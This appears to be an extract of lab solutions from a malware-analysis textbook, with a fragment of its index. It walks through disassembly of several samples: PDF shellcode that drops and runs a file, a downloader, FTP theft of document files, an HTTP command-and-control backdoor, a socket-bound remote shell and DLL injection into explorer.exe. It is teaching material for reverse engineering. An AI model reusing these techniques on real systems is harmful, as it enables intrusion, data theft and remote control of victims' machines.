00000221   xor     eax, eax
00000223   lea     edi, [ebp-124h] ; file path buffer
00000229   repne scasb
0000022B   dec     edi
0000022C   mov     [ebp-1Ch], edi
0000022F   mov     dword ptr [edi], 2E6F6F66h ; "foo." E11
00000235   mov     dword ptr [edi+4], 657865h ; "exe\x00"
[Word Count: 80]

Listing 19-17L: First filename creation for the first output file
[Word Count: 10]

This extracted file is written to disk using the helper function we’ve 
named writeBufferToDisk. Analysis shows that this has the following function 
prototype:
[Word Count: 23]

__stdcall void writeBufferToDisk(DWORD* globalStructPtr, char* buffPtr, DWORD 
btesToWrite, DWORD maskVal, char* namePtr);
[Word Count: 12]

This function will XOR each byte in the input buffer with the value pro-
vided in maskVal, and then write the decoded buffer to the filename given by 
namePtr. The call to writeBufferToDisk at  in Listing 19-18L will use an XOR 
mask of 0x4a and write the file to %TEMP%\foo.exe. This filename is passed 
to the call to CreateProcessA at , creating a new process from the file just 
written to disk.
[Word Count: 73]

Listing 19-18L: Decoding, writing, and launching the first file
[Word Count: 9]

The shellcode repeats the same procedure in Listing 19-19L for a second 
file stored encoded within the malicious PDF. It allocates space according 
to the file size stored at offset 0x4c within the embedded data at , and 
adjusts the file pointer location using the file offset stored at offset 0x48 at .
[Word Count: 53]

0000028F   xor     edx, edx
00000291   mov     ebx, [ebp-14h]
[Word Count: 8]

00000294   push    dword ptr [ebx+4Ch] ; File 2 Size 
00000297   push    edx
00000298   call    dword ptr [ebx+30h] ; GlobalAlloc
0000029B   test    eax, eax
0000029D   jz      short loc_313
0000029F   mov     [ebp-10h], eax
000002A2   xor     edx, edx
000002A4   push    edx
000002A5   push    edx
000002A6   push    dword ptr [ebx+48h] ; File 2 Offset 
000002A9   push    dword ptr [ebp-8] ; PDF File Handle
000002AC   call    dword ptr [ebx+20h] ; SetFilePointer
[Word Count: 68]

Listing 19-19L: Allocating space for the second file
[Word Count: 8]

The shellcode in Listing 19-20L uses the same temporary file path as 
in the first file, but replaces the filename with bar.pdf at . The call to 
writeBufferToDisk at  decodes the file contents using the mask value 0x4a, 
and writes it to %TEMP%\bar.pdf.
[Word Count: 44]

Listing 19-20L: Reading, decoding, and writing the second embedded file
[Word Count: 10]

Finally, the shellcode in Listing 19-21L opens the PDF file it just wrote to 
%TEMP%\bar.pdf using the call to ShellExecuteA at . It passes in the com-
mand string "open" at  and the path to the PDF at , which causes the sys-
tem to open the specified file with the application registered to handle it.
[Word Count: 57]

000002E8   xor     ecx, ecx
000002EA   lea     eax, [ebp-168h] ; scratch space, for ShellExecute lpOperation verb
000002F0   mov     dword ptr [eax], 6E65706Fh ; "open" 
000002F6   mov     byte ptr [eax+4], 0
000002FA   push    5               ; SW_SHOWNORMAL | SW_SHOWNOACTIVATE
000002FF   push    ecx
00000300   push    ecx
00000301   lea     eax, [ebp-124h] ; output PDF filename 
00000307   push    eax
[Word Count: 55]

00000308   lea     eax, [ebp-168h] ; ptr to "open"
0000030E   push    eax
0000030F   push    ecx
00000310   call    dword ptr [ebx+38h] ; ShellExecuteA 
00000313 loc_313:
00000313   call    dword ptr [ebx+0Ch] ; GetCurrentProcess
00000316   push    0
0000031B   push    eax
0000031C   call    dword ptr [ebx+8] ; TerminateProcess
[Word Count: 44]

Listing 19-21L: Opening the second file and exiting
[Word Count: 8]

It is common for malicious media files to contain legitimate files that are 
extracted and opened by the shellcode in an attempt to avoid raising suspi-
cion. The expectation is that users will simply think that any delay is due to a 
slow computer, when actually the exploit has just launched a new process, 
and then opened a real file to cover its tracks.
[Word Count: 64]

1.
The function at 0x401040 does not take any parameters, but it is passed a 
reference to an object in ECX that represents the this pointer.
[Word Count: 26]

2.
The call to URLDownloadToFile uses http://www.practicalmalwareanalysis.com/
cpp.html as the URL.
[Word Count: 11]

3.
This program downloads a file from a remote server and stores it as 
c:\tempdownload.exe on the local system.
[Word Count: 19]

This short lab is intended to demonstrate the usage of the this pointer. The 
bulk of the main method is shown in Listing 20-1L.
[Word Count: 24]

00401006                 push    4
00401008               call    ??2@YAPAXI@Z    ; operator new(uint)
0040100D                 add     esp, 4
00401010               mov     [ebp+var_8], eax
00401013                 mov     eax, [ebp+var_8]
00401016               mov     [ebp+var_4], eax
00401019               mov     ecx, [ebp+var_4]
0040101C                 mov     dword ptr [ecx], offset aHttpWww_practi ;
;0 "http://www.practicalmalwareanalysis.com"...
00401022                 mov     ecx, [ebp+var_4]
00401025                 call    sub_401040
[Word Count: 46]

Listing 20-1L: The main method for Lab20-01.exe
[Word Count: 7]

The code in Listing 20-1L begins with a call to the new operator at , 
which tells us that this code is creating an object. A reference to the object is 
returned in EAX, and is eventually stored in var_8 at  and var_4 at . var_4
[Word Count: 47]

is moved into ECX at , indicating that it will be passed as the this pointer in 
a function call. A pointer to the URL http://www.practicalmalwareanalysis.com/
cpp.html is then stored at the beginning of the object, followed by a call to the 
function sub_401040, which is shown in Listing 20-2L.
[Word Count: 50]

00401043                 push    ecx
00401044               mov     [ebp+var_4], ecx
00401047                push    0               ; LPBINDSTATUSCALLBACK
00401049                 push    0               ; DWORD
0040104B                 push    offset aCEmpdownload_e ; "c:\tempdownload.exe"
00401050               mov     eax, [ebp+var_4]
00401053               mov     ecx, [eax]
00401055               push    ecx             ; LPCSTR
00401056                 push    0               ; LPUNKNOWN
00401058                 call    URLDownloadToFileA
[Word Count: 44]

Listing 20-2L: Code listing for sub_401040
[Word Count: 6]

1.
The most interesting strings are ftp.practicalmalwareanalysis.com and Home 
ftp client, which indicate that this program may be FTP client software.
[Word Count: 21]

2.
The imports FindFirstFile and FindNextFile indicate that the program prob-
ably searches through the victim’s filesystem. The imports InternetOpen, 
InternetConnect, FtpSetCurrentDirectory, and FtpPutFile tell us that this mal-
ware may upload files from the victim machine to a remote FTP server.
[Word Count: 42]

3.
The object created at 0x004011D9 represents a .doc file. It has one virtual 
function at offset 0x00401440, which uploads the file to a remote FTP 
server.
[Word Count: 27]

4.
The virtual function call at 0x00401349 will call one of the virtual func-
tions at 0x00401380, 0x00401440, or 0x00401370.
[Word Count: 20]

5.
This malware connects to a remote FTP server using high-level API func-
tions. We could download and set up a local FTP server, and redirect 
DNS requests to that server in order to fully exercise this malware.
[Word Count: 38]

6.
This program searches the victim’s hard drive and uploads all the files 
with a .doc or .pdf extension to a remote FTP server.
[Word Count: 24]

7.
The purpose of implementing a virtual function call is to allow the code 
to execute different upload functions for different file types.
[Word Count: 23]

00401500                 push    ebp
00401501                 mov     ebp, esp
00401503                 sub     esp, 198h
00401509                 mov     [ebp+wVersionRequested], 202h
00401512                 lea     eax, [ebp+WSAData]
00401518                 push    eax             ; lpWSAData
00401519                 mov     cx, [ebp+wVersionRequested]
00401520                 push    ecx             ; wVersionRequested
00401521               call    WSAStartup
00401526                 mov     [ebp+var_4], eax
00401529                 push    100h            ; namelen
0040152E               push    offset name     ; name
00401533               call    gethostname
00401538                 push    0               ; int
0040153A                 push    offset FileName ; "C:\\*"
0040153F               call    sub_401000
00401544                 add     esp, 8
00401547                 xor     eax, eax
00401549                 mov     esp, ebp
0040154B                 pop     ebp
0040154C                 retn    10h
[Word Count: 86]

Listing 20-3L: The main method for Lab 20-2
[Word Count: 8]

004011D9                 push    8
004011DB                 call    ??2@YAPAXI@Z    ; operator new(uint)
004011E0                 add     esp, 4
004011E3               mov     [ebp+var_15C], eax
004011E9                 cmp     [ebp+var_15C], 0
004011F0                 jz      short loc_401218
004011F2                 mov     edx, [ebp+var_15C]
004011F8               mov     dword ptr [edx], offset off_4060E0
004011FE                 mov     eax, [ebp+var_15C]
00401204               mov     dword ptr [eax], offset off_4060DC
0040120A                 mov     ecx, [ebp+var_15C]
00401210                 mov     [ebp+var_170], ecx
00401216                 jmp     short loc_401222
[Word Count: 59]

Listing 20-4L: Object creation code if a file ending in .doc is found.
[Word Count: 13]

0040132F                 mov     ecx, [ebp+var_148]
00401335                 mov     edx, [ebp+var_4]
00401338                 mov     [ecx+4], edx
0040133B                 mov     eax, [ebp+var_148]
00401341                 mov     edx, [eax]
00401343                 mov     ecx, [ebp+var_148]
00401349                 call    dword ptr [edx]
[Word Count: 29]

This code references the object stored in var_148, and then calls the first 
pointer in the virtual function pointer table. This code is the same whether a 
.pdf or .doc object is created, but the function called differs for different types 
of objects. 
We saw earlier that the code could create one of three different objects:
[Word Count: 56]


An object for .pdf files, which we’ll call pdfObject. The first function for 
this object in the virtual function table is at 0x4060D8.
[Word Count: 24]


An object for .doc files, which we’ll call docObject. The first function in the 
virtual function table for this object is at 0x4060DC.
[Word Count: 24]


An object for all other files, which we’ll call otherObject. The first func-
tion in the virtual function table for this object is at 0x4060E0.
[Word Count: 26]

1.
Several strings that look like error messages (Error sending Http post, 
Error sending Http get, Error reading response, and so on) tell us that this 
program will be using HTTP GET and POST commands. We also see HTML 
paths (/srv.html, /put.html, and so on), which hint at the files that this 
malware will attempt to open.
[Word Count: 57]

2.
Several WS2_32 imports tell us that this program will be communicating 
over the network. An import to CreateProcess suggests that this program 
may launch another process.
[Word Count: 27]

3.
The function called at 0x4036F0 does not take any parameters other 
than the string, but ECX contains the this pointer for the object. We 
know the object that contains the function is an exception object because 
that object is later used as a parameter to the CxxThrowException functions. 
We can tell from the context that the function at 0x4036F0 initializes 
an exception object, which stores a string that describes what caused the 
exception.
[Word Count: 74]

4.
The six entries of the switch table implement six different backdoor 
commands: NOOP, sleep, execute a program, download a file, upload 
a file, and survey the victim.
[Word Count: 28]

5.
The program implements a backdoor that uses HTTP as the command 
channel and has the ability to launch programs, download or upload a 
file, and collect information about the victim machine.
[Word Count: 32]

When we look at the program’s strings, we see several that look like error 
messages, as shown in Listing 20-6L.
[Word Count: 20]

Encoding Args Error
Beacon response Error
Caught exception during pollstatus: %s
Polling error
Arg parsing error
Error uploading file
Error downloading file
Error conducting machine survey
Create Process Failed
Failed to gather victim information
Config error
Caught exception in main: %s
Socket Connection Error
Host lookup failed.
Send Data Error
[Word Count: 50]

Error reading response
Error sending Http get
Error sending Http post
[Word Count: 11]

Listing 20-6L: Abbreviated listing of strings from Lab20-03.exe
[Word Count: 8]

These error messages provide excellent insight into the program’s func-
tionality. These messages tell us that the malware probably does the following:
[Word Count: 22]


Polls a remote server for some reason (probably for commands to 
execute)
[Word Count: 13]

00403C03                 push    30h
00403C05                 mov     [ebp+var_4], ebx
00403C08               call    ??2@YAPAXI@Z    ; operator new(uint)
00403C0D               mov     ecx, eax
00403C0F                 add     esp, 4
00403C12                 mov     [ebp+var_14], ecx
00403C15                 cmp     ecx, ebx
00403C17                 mov     byte ptr [ebp+var_4], 1
00403C1B                 jz      short loc_403C2B
00403C1D                 push    offset FileName ; "config.dat"
00403C22               call    sub_401EE0
00403C27                 mov     esi, eax
[Word Count: 52]

Listing 20-7L: An object being created and used in main2
[Word Count: 10]

IDA Pro labels the new operator at  and returns a pointer to the new 
object in EAX. A pointer to the object is moved into ECX at , where it is 
used as the this pointer to the function call at . This tells us that the func-
tion sub_401EE0 is a member function of the class of the object created at . 
For now, we’ll call this object firstObject. Listing 20-8L shows how it’s used in 
sub_401EE0.
[Word Count: 79]

00401EF7               mov     esi, ecx
00401EF9                 push    194h
00401EFE               call    ??2@YAPAXI@Z    ; operator new(uint)
00401F03                 add     esp, 4
00401F06                 mov     [esp+14h+var_10], eax
00401F0A                 test    eax, eax
00401F0C                 mov     [esp+14h+var_4], 0
00401F14                 jz      short loc_401F24
00401F16                 mov     ecx, [esp+14h+arg_0]
00401F1A                 push    ecx
00401F1B                 mov     ecx, eax
00401F1D               call    sub_403180
[Word Count: 47]

Listing 20-8L: The first function being called on firstObject
[Word Count: 9]

sub_401EE0 first stores the pointer to firstObject in ESI at , and then 
creates another new object at , which we’ll call secondObject. Then it calls a 
function of the secondObject at . We need to keep analyzing before we can 
determine the purpose of these objects, so we now look at sub_403180, as 
shown in Listing 20-9L.
[Word Count: 58]

00403199                 push    offset FileName ; "config.dat"
0040319E                 mov     dword ptr [esi], offset off_41015C
004031A4                 mov     byte ptr [esi+18Ch], 4Eh
004031AB               call    ds:CreateFileA
004031B1                 mov     edi, eax
004031B3                 cmp     edi, 0FFFFFFFFh
004031B6               jnz     short loc_4031D5
004031B8                 push    offset aConfigError ; "Config error"
004031BD               lea     ecx, [esp+0BCh+var_AC]
004031C1               call    sub_4036F0
004031C6                 lea     eax, [esp+0B8h+var_AC]
004031CA                 push    offset unk_411560
004031CF               push    eax
004031D0                 call    __CxxThrowException@8 ; _CxxThrowException(x,x)
[Word Count: 64]

Listing 20-9L: An exception being created and thrown
[Word Count: 8]

00401F2A
mov
[esi], eax
00401F2C
mov
dword ptr [esi+10h], offset aIndex_html ; "/index.html"
00401F33
mov
dword ptr [esi+14h], offset aInfo_html ; "/info.html"
00401F3A
mov
dword ptr [esi+18h], offset aResponse_html ; "/response.html"
00401F41
mov
dword ptr [esi+1Ch], offset aGet_html ; "/get.html"
00401F48
mov
dword ptr [esi+20h], offset aPut_html ; "/put.html"
00401F4F
mov
dword ptr [esi+24h], offset aSrv_html ; "/srv.html"
00401F56
mov
dword ptr [esi+28h], 544F4349h
00401F5D
mov
dword ptr [esi+2Ch], 41534744h
00401F64
mov
eax, esi
[Word Count: 74]

Listing 20-10L: Data being stored in firstObject
[Word Count: 7]

00403C2D               mov     ecx, esi
00403C2F                 mov     byte ptr [ebp+var_4], bl
00403C32                 call    sub_401F80
00403C37                 mov     edi, ds:Sleep
00403C3D loc_403C3D:
00403C3D                 mov     eax, [esi]
00403C3F                 mov     eax, [eax+190h]
00403C45                 lea     eax, [eax+eax*4]
00403C48                 lea     eax, [eax+eax*4]
00403C4B                 lea     ecx, [eax+eax*4]
00403C4E                 shl     ecx, 2
00403C51                 push    ecx             ; dwMilliseconds
[Word Count: 48]

00403C52                 call    edi ; Sleep
00403C54               mov     ecx, esi
00403C56                 call    loc_402410
00403C5B                 inc     ebx
00403C5C                 jmp     short loc_403C3D
[Word Count: 19]

Listing 20-11L: Beacon and poll commands in the main2 function
[Word Count: 10]

00401FC8                 mov   eax, [esi]
00401FCA                 mov   edx, [eax+144h]
00401FD0                 add   eax, 104h
00401FD5                 push    edx             ; hostshort
00401FD6                 push    eax             ; char *
00401FD7                 call    sub_403D50
[Word Count: 26]

Listing 20-12L: First function call in the maybe_beacon function
[Word Count: 9]

0040301C
call    ds:GetComputerNameA
00403022
test    eax, eax
00403024
jnz     short loc_403043
00403026
push
offset aErrorConductin ; "Error conducting machine survey"
0040302B
lea     ecx, [esp+40h+var_1C]
0040302F
call    sub_403910
00403034
lea     eax, [esp+3Ch+var_1C]
00403038
push    offset unk_411150
0040303D
push    eax
0040303E
call    __CxxThrowException@8 ; _CxxThrowException(x,x)
[Word Count: 43]

Listing 20-13L: Beginning of the victim survey function
[Word Count: 8]

0040251F                 mov     al, [esi+4]
00402522                 add     eax, -61h       ; switch 6 cases
00402525                 cmp     eax, 5
00402528                 ja      short loc_40257D ; default
0040252A                 jmp     ds:off_4025C8[eax*4] ; switch jump
[Word Count: 28]

Listing 20-14L: switch statements inside the maybe_poll function
[Word Count: 8]

The value used for the switch decision is stored in [esi+4]. That value is 
then stored in EAX, and 0x61 is subtracted from it. If the value is not lower 
than five, none of the switch jumps are taken. This ensures that the value is 
between 0x61 and 0x66 (which represents ASCII characters a through f ). 
0x61 less than the value is then used as an offset into the switch table. IDA 
Pro has recognized and labeled the switch table.
[Word Count: 81]

We click off_4025C8, which takes us to the six possible locations that we 
need to analyze. We’ll label these case_1 through case_6 and analyze them 
one at a time:
[Word Count: 29]


case_1 calls the delete operator and then immediately returns without 
actually doing anything. We’ll rename this case_doNothing.
[Word Count: 18]


case_2 calls atoi to parse a string into a number, and then calls the sleep 
function before returning. We’ll rename it case_sleep.
[Word Count: 23]


case_3 does some string parsing, and then calls CreateProcess. We’ll 
rename it case_ExecuteCommand.
[Word Count: 14]


case_4 calls CreateFile and writes the HTTP response received from the 
command-and-control server to disk. We’ll rename it case_downloadFile.
[Word Count: 20]


case_5 also calls CreateFile, but it uploads the data from the file to 
the remote server using an HTTP POST command. We’ll rename it 
case_uploadFile.
[Word Count: 26]


case_6 calls GetComputerName, GetUserName, GetVersionEx, and GetDefaultLCID, 
which together perform a survey of the victim’s machine and send the 
results back to the command-and-control server.
[Word Count: 26]

Overall, we have a backdoor program that reads a configuration file 
that determines the command-and-control server, sends a beacon to the 
command-and-control server, and implements several different functions 
based on the response from the command-and-control server.
[Word Count: 36]

1.
When you run the program without any parameters, it exits immediately.
[Word Count: 12]

2.
The main function is located at 0x00000001400010C0. You can spot the 
call to main by looking for a function call that accepts an integer and two 
pointers as parameters.
[Word Count: 30]

3.
The string ocl.exe is stored on the stack.
[Word Count: 9]

4.
To have this program run its payload without changing the filename of the 
executable, you can patch the jump instruction at 0x0000000140001213 so 
that it is a NOP instead.
[Word Count: 30]

5.
The name of the executable is being compared against the string jzm.exe 
by the call to strncmp at 0x0000000140001205.
[Word Count: 20]

6.
The function at 0x00000001400013C8 takes one parameter, which con-
tains the socket created to the remote host.
[Word Count: 18]

7.
The call to CreateProcess takes 10 parameters. We can’t tell from the IDA 
Pro listing because we can’t distinguish between things being stored on 
the stack and things being used in a function call, but the function is 
documented in MSDN as always taking 10 parameters.
2 1
[Word Count: 49]

When we try to run this program to perform dynamic analysis, it immediately 
exits, so we open the program and try to find the main method. (You won’t 
need to do this if you have the latest version of IDA Pro; if you have an older 
version, you may need to find the main method.) 
We begin our analysis at 0x0000000140001750, the entry point as speci-
fied in the PE header, as shown in Listing 21-1L.
[Word Count: 76]

0000000140001750         sub     rsp, 28h
0000000140001754         call    sub_140002FE4 
0000000140001759         add     rsp, 28h
000000014000175D         jmp     sub_1400015D8 
[Word Count: 16]

Listing 21-1L: Entry point of Lab21-01.exe
[Word Count: 6]

00000001400016F3         mov     r8, cs:qword_14000B468 
00000001400016FA         mov     cs:qword_14000B470, r8
0000000140001701         mov     rdx, cs:qword_14000B458 
0000000140001708         mov     ecx, cs:dword_14000B454 
000000014000170E         call    sub_1400010C0
[Word Count: 22]

Listing 21-2L: Call to the main method of Lab21-01.exe
[Word Count: 9]

We can now move on to the main function. Early in the main function, 
we see a lot of data moved onto the stack, including the data shown in List-
ing 21-3L.
[Word Count: 32]

0000000140001150         mov     byte ptr [rbp+250h+var_160+0Ch], 0
0000000140001157         mov     [rbp+250h+var_170], 2E6C636Fh
0000000140001161         mov     [rbp+250h+var_16C], 657865h
[Word Count: 14]

Listing 21-3L: ASCII string being loaded on the stack that has not been recognized by 
IDA Pro
[Word Count: 17]

You should immediately notice that that numbers being moved onto the 
stack represent ASCII characters. The value 0x2e is a period (.), and the hexa-
decimal values starting with 3, 4, 5, and 6 are mostly letters. Right-click the
[Word Count: 39]

numbers to have IDA Pro show which characters are represented, and press 
R on each line to change the display. After changing the display so that the 
ASCII characters are labeled properly by IDA Pro, the code should look like 
Listing 21-4L.
[Word Count: 42]

0000000140001150         mov     byte ptr [rbp+250h+var_160+0Ch], 0
0000000140001157         mov     [rbp+250h+var_170], '.lco'
0000000140001161         mov     [rbp+250h+var_16C], 'exe'
[Word Count: 14]

Listing 21-4L: Listing 21-3L with the ASCII characters labeled properly by IDA Pro
[Word Count: 13]

00000001400011B8         mov     eax, 4EC4EC4Fh
00000001400011BD         sub     cl, 61h
00000001400011C0         movsx   ecx, cl
00000001400011C3         imul    ecx, ecx
00000001400011C6         sub     ecx, 5
00000001400011C9         imul    ecx
00000001400011CB         sar     edx, 3
00000001400011CE         mov     eax, edx
00000001400011D0         shr     eax, 1Fh
00000001400011D3         add     edx, eax
00000001400011D5         imul    edx, 1Ah
00000001400011D8         sub     ecx, edx
[Word Count: 47]

This encoding function would be very tedious to analyze, so we note it 
and move on to see what is done with the encoded string. We scroll down a 
little further to a call to strncmp, as shown in Listing 21-6L.
[Word Count: 41]

00000001400011F4         lea     rdx, [r11+1]    ; char *
00000001400011F8         lea     rcx, [rbp+250h+var_170] ; char *
00000001400011FF         mov     r8d, 104h       ; size_t
0000000140001205         call    strncmp
000000014000120A         test    eax, eax
000000014000120C         jz      short loc_140001218 
000000014000120E
000000014000120E loc_14000120E:                  ; CODE XREF: main+16Aj
2 1
[Word Count: 41]

000000014000120E         mov     eax, 1
0000000140001213         jmp     loc_1400013D7 
[Word Count: 8]

Listing 21-6L: Code that compares the filename against the encoded string and takes one 
of two different code paths
[Word Count: 19]

Figure 21-1L: Using WinDbg to see the string that is being compared in Lab 21-1
[Word Count: 15]

WinDbg output can sometimes be a bit verbose, so we’ll focus on the 
commands issued. We can’t set a breakpoint using bp strncmp because WinDbg 
doesn’t know the location of strncmp. However, IDA Pro uses signatures to 
find strncmp, and from Listing 21-6L, we know that the call to strncmp is at 
0000000140001205. As shown in Figure 21-1L, at , we use the u instruction 
to verify the instructions at 0000000140001205, and then set a breakpoint on
[Word Count: 77]

00000001400013BD        mov     rcx, rbx 
00000001400013C0         movdqa  oword ptr [rbp+250h+var_160], xmm0
00000001400013C8         call    sub_140001000
[Word Count: 14]

Listing 21-7L: A 64-bit function call with an unclear number of parameters
[Word Count: 12]

At , the RBX register is moved into RCX. We can’t be sure if this is 
just normal register movement or if this is a function parameter. Looking 
back to see what is stored in RBX, we discover that it stores the socket 
that was returned by WSASocket. Once we start to analyze the function at 
0x0000000140001000, we see that value used as a parameter to CreateProcessA. 
The call to CreateProcessA is shown in Listing 21-8L.
[Word Count: 76]

0000000140001025         mov     [rsp+0E8h+hHandle], rax
000000014000102A         mov     [rsp+0E8h+var_90], rax
000000014000102F         mov     [rsp+0E8h+var_88], rax
0000000140001034         lea     rax, [rsp+0E8h+hHandle]
0000000140001039         xor     r9d, r9d        ; lpThreadAttributes
000000014000103C         xor     r8d, r8d        ; lpProcessAttributes
000000014000103F         mov     [rsp+0E8h+var_A0], rax
0000000140001044         lea     rax, [rsp+0E8h+var_78]
0000000140001049         xor     ecx, ecx        ; lpApplicationName
000000014000104B         mov     [rsp+0E8h+var_A8], rax 
0000000140001050         xor     eax, eax
0000000140001052         mov     [rsp+0E8h+var_78], 68h
000000014000105A         mov     [rsp+0E8h+var_B0], rax
000000014000105F         mov     [rsp+0E8h+var_B8], rax
0000000140001064         mov     [rsp+0E8h+var_C0], eax
0000000140001068         mov     [rsp+0E8h+var_C8], 1
0000000140001070         mov     [rsp+0E8h+var_3C], 100h
000000014000107B         mov     [rsp+0E8h+var_28], rbx 
0000000140001083         mov     [rsp+0E8h+var_18], rbx 
000000014000108B         mov     [rsp+0E8h+var_20], rbx 
0000000140001093         call    cs:CreateProcessA
[Word Count: 93]

Listing 21-8L: A 64-bit call to CreateProcessA
[Word Count: 7]

The socket is stored at RBX in code not shown in the listing. All the 
parameters are moved onto the stack instead of pushed onto the stack, 
which makes the function call considerably more complicated than the 
32-bit version.
2 1
[Word Count: 41]

1.
The malware contains the resource sections X64, X64DLL, and X86. Each of 
the resources contains an embedded PE file.
[Word Count: 20]

2.
Lab21-02.exe is compiled for a 32-bit system. This is shown in the PE 
header’s Characteristics field, where the IMAGE_FILE_32BIT_MACHINE flag 
is set.
[Word Count: 23]

3.
The malware attempts to resolve and call IsWow64Process to determine if it 
is running on an x64 system.
[Word Count: 19]

4.
On an x86 machine, the malware drops the X86 resource to disk and 
injects it into explorer.exe. On an x64 machine, the malware drops two 
files from the X64 and X64DLL resource sections to disk and launches the 
executable as a 64-bit process.
[Word Count: 44]

5.
On an x86 system, the malware drops Lab21-02.dll into the Windows sys-
tem directory, which will typically be C:\Windows\System32\.
[Word Count: 20]

6.
On an x64 system, the malware drops Lab21-02x.dll and Lab21-02x.exe 
into the Windows system directory, but because this is a 32-bit process 
running in WOW64, the directory is C:\Windows\SysWOW64\.
[Word Count: 30]

7.
On an x64 system, the malware launches Lab21-02x.exe, which is a 64-bit 
process. You can see this in the PE header, where the Characteristics 
field has the IMAGE_FILE_64BIT_MACHINE flag set.
[Word Count: 31]

8.
On both x64 and x86 systems, the malware performs DLL injection into 
explorer.exe. On an x64 system, it drops and runs a 64-bit binary to inject a 
64-bit DLL into the 64-bit running explorer.exe. On an x86 system, it injects 
a 32-bit DLL into the 32-bit running explorer.exe.
[Word Count: 49]

Because this malware is the same as Lab12-01.exe except with an added x64 
component, a good place to begin our analysis is with Lab 12-1. Let’s start by 
examining the new strings found in this binary, as follows:
[Word Count: 38]

IsWow64Process
Lab21-02x.dll
X64DLL
X64
X86
Lab21-02x.exe
Lab21-02.dll
[Word Count: 7]

We see a couple of strings that reference x64, as well as the string 
IsWow64Process, an API call that can tell malware if it is running as a 32-bit 
process on a 64-bit machine. We also see three suspicious filenames: 
Lab21-02.dll, Lab21-02x.dll, and Lab21-02x.exe. 
Next, we look at the malware in PEview, as shown in Figure 21-2L.
[Word Count: 57]

Figure 21-2L: PEview showing three different resource sections
[Word Count: 8]

004012F2         push    offset aIswow64process  ; "IsWow64Process"
004012F7         push    offset ModuleName       ; "kernel32"
004012FC         mov     [ebp+var_10], 0
00401303         call    ebx ; GetModuleHandleA 
00401305         push    eax             ; hModule
00401306         call    edi ; GetProcAddress 
00401308         mov     myIsWow64Process, eax
2 1
[Word Count: 39]

0040130D         test    eax, eax 
0040130F         jz      short loc_401322
00401311         lea     edx, [ebp+var_10]
00401314         push    edx
00401315         call    ds:GetCurrentProcess
0040131B         push    eax
0040131C         call    myIsWow64Process 
[Word Count: 26]

Listing 21-9L: Dynamically resolving IsWow64Process and calling it
[Word Count: 8]

The x86 code path first passes the strings Lab21-02.dll and X86 to sub_401000. 
Based on our static analysis, we can guess and rename this function 
extractResource, as shown in Listing 21-10L at .
[Word Count: 33]

004013D9         push    offset aLab2102_dll     ; "Lab21-02.dll"
004013DE         push    offset aX86             ; "X86"
004013E3         call    extractResource       ; formerly sub_401000
[Word Count: 19]

Listing 21-10L: extractResource being called with X86 parameters
[Word Count: 8]

The x64 code path begins by calling the extractResource function twice to 
extract the X64 and X64DLL resources to disk, as shown in Listing 21-11L.
[Word Count: 25]

0040132F         push    offset aLab2102x_dll    ; "Lab21-02x.dll"
00401334         push    offset aX64dll          ; "X64DLL"
00401339         mov     eax, edi
0040133B         call    extractResource
...
0040134D         push    offset aLab2102x_exe    ; "Lab21-02x.exe"
00401352         push    offset aX64             ; "X64"
00401357         mov     eax, edi
00401359         call    extractResource
[Word Count: 39]

Listing 21-11L: Resource extraction of two binaries when run on x64
[Word Count: 11]

00000001400011BF         lea     rdx, String2 ; "C:\\Windows\\SysWOW64\\"
00000001400011C6         lea     rcx, [rsp+1168h+Buffer] ; lpString1
...
00000001400011D2         call    cs:lstrcpyA 
00000001400011D8         lea     rdx, aLab2102x_dll      ; "Lab21-02x.dll"
00000001400011DF         lea     rcx, [rsp+1168h+Buffer] ; lpString1
00000001400011E4         call    cs:lstrcatA 
...
00000001400012CF         lea     r8, [rsp+1168h+Buffer]; lpBuffer
00000001400012D4         mov     r9d, 104h               ; nSize
00000001400012DA         mov     rdx, rax        ; lpBaseAddress
00000001400012DD         mov     rcx, rsi        ; hProcess
00000001400012E0         mov     [rsp+1168h+var_1148], 0
00000001400012E9         call    cs:WriteProcessMemory
[Word Count: 64]

Listing 21-12L: Building the DLL path string and writing it to a remote process
2 1
[Word Count: 16]

00000001400010FA         call    cs:QueryFullProcessImageNameA
0000000140001100         lea     rdx, aExplorer_exe    ; "explorer.exe"
0000000140001107         lea     rcx, [rsp+138h+var_118]
000000014000110C         call    sub_140001368
[Word Count: 17]

Listing 21-13L: Code that uses QueryFullProcessImageNameA to look for the explorer.exe 
process
[Word Count: 12]

This code is called within the process iteration loop, and the result of 
QueryFullProcessImageNameA is passed with explorer.exe to sub_140001368. By 
inference, we can conclude that this is some sort of string-comparison func-
tion that the IDA Pro FLIRT library didn’t recognize. 
This malware operates in the same way as the x86 version by injecting 
into explorer.exe. However, this 64-bit version injects into the 64-bit version of 
Explorer. We open Lab21-02x.dll in the advanced version of IDA Pro and see 
that it is identical to Lab21-02.dll, but compiled for x64.
[Word Count: 90]

! (bang symbol), 305
-- operation, 112
% operation, 112
% symbol, 423
| (pipe symbol), in Snort, 304
++ operation, 112
010 Editor, 468
32-bit applications, WOW64 and, 448
32-bit rotate-right-additive hash, 418
64-bit malware, 441–449
clues to functionality, 448
labs, 450–451
solutions, 723–732
[Word Count: 45]

A, at end of Windows function 
name, 17
absolute addresses, 443
vs. relative addresses, in OllyDbg, 
184–185
abstraction levels, in x86 disassembly, 
66–67
accept function, 143, 144, 454
access token, 246
accuracy, vs. expediency, 304
active window, logging, 239
ADD encoding algorithm, 276
add instruction, 74, 349
AddCodeXref function (IDC), 342
address space, loading executable 
into another process’s, 595
address space layout randomization 
(ASLR), 184
AddressOfNameOrdinals array, 416
AddressOfNames array, 416
AdjustTokenPrivileges function, 246, 
247, 454, 730
[Word Count: 77]

assembly-level debuggers, vs. 
source-level, 168
asynchronous procedure call 
(APC), 263
AT_INFO structure, 547–548
AttachThreadInput function, 454
attackers
identifying investigative activity, 299
safely investigating online, 300–302
Autoruns tool, 140, 241, 465–466
[Word Count: 30]

breakpoints, continued
setting, 357
setting on stack, 690
in WinDbg, 211–212
bridged network adapter, 34
Browser Helper Objects (BHOs), 157
brute-force XOR encoding, 271–273
bu command, in WinDbg, 212
bu $iment command, in WinDbg, 
213, 554
buffer, malware placement of 
value in, 538
buffer-overflow attack, 421
Burp Suite, 467
Buster Sandbox Analyzer, 473
byte array initialization, 680–681
bytecode, 67
[Word Count: 59]

C code constructs in assembly, 
109–132
arithmetic operations disassembly, 
112–113
array disassembly, 127–128
function call conventions, 119–121
global vs. local variables, 110–112
if statements, 113–116
labs, 133–134
solutions, 501–513
linked list traversal, 130–132
loops, 116–118
for loops, 116–118
while loops, 118
structures, identifying, 128–130
switch statements, 121–126
if style for, 122–123, 124
jump table, 123–126
C programming language, 110
function pointers in, 340
